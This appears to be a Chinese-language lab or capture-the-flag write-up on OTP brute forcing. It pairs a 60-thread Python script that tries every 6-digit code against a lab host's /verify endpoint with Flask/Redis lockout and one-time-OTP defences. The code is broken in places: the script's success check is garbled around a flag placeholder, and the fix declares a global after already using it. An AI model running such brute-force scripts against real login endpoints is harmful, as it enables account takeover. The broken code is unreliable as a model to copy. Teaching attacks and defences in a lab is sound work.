## 为什么 6 位数字在短信场景曾被误当作“安全”：

- 常见误解：短信 OTP 是带外通道 → 攻击者不知道验证码 → 6 位数字够了
- 真实情况：**只要接口暴露在互联网**，攻击者根本不用“猜” → 直接爆破 10^6 空间
- 移动银行/第三方登录因此往往改用 **3 次失败直接卡 + 24h 解锁 + 强 CAPTCHA**

**Important**

**本题一句话心智模型：**

"任何认证接口 = 必须速率限制，否则低熵凭证（4/6 位数字 PIN、OTP、动态码）都能分钟级被爆破"一防御必须叠三层：账户锁 + IP 限速 + OTP 生命周期管理。

import requests, threading, time
from concurrent.futures import ThreadPoolExecutor

B = "http://192.168.1.100:32821"
found = [None]
count = [0]
lock = threading.Lock()
t0 = time.time()

def try_otp(otp_int):
    if found[0]: return
    otp = f"{otp_int:06d}"
    try:
        r = requests.post(B + "/verify",
                          data={"username":"admin","otp":otp},
                          timeout=5, allow_redirects=True)
    except Exception:
        return
    with lock:
        count[0] += 1
        if count[0] % 1000 == 0:
            print(f"[{count[0]}] elapsed={time.time()-t0:.1f}s "
                  f"rate={count[0]/(time.time()-t0):.0f}/s try={otp}", flush=True)
    if r.status_code == 200 and "[FLAG 占位]\n{r.text[:500]}", flush=True)

with ThreadPoolExecutor(max_workers=60) as ex:
    for i in range(1000000):
        if found[0]: break
        ex.submit(try_otp, i)

from redis import Redis
r = Redis()
MAX_FAILS = 5
LOCK_SECONDS = 1800   # 30 分钟

@app.route('/verify', methods=['POST'])
def verify():
    u = request.form.get('username', '')
    otp = request.form.get('otp', '')

    # 1. 锁定检查
    if r.exists(f'lock:{u}'):
        return 'account locked, try again later', 429

    # 2. 核验
    if u == 'admin' and otp == admin_otp:
        r.delete(f'fails:{u}')
        # ★ OTP 一次性：验证成功立即轮换
        global admin_otp
        admin_otp = f"{secrets.randbelow(1000000):06d}"
        session['user'] = 'admin'
        return redirect(url_for('index'))

    # 3. 失败 + 计数
    fails = r.incr(f'fails:{u}')
    r.expire(f'fails:{u}', LOCK_SECONDS)
    if fails > MAX_FAILS:
        r.set(f'lock:{u}', 1, ex=LOCK_SECONDS)
        # ★ 触发 OTP 轮换 + 通知短信
        return 'account locked', 429
    return 'wrong otp', 401

def verify_otp(user, otp):
    stored = r.get(f'otp:{user}')
    if not stored: return False          # 过期/未请求
    if otp != stored.decode(): return False
    r.delete(f'otp:{user}')              # ★ 一次性消费
    return True
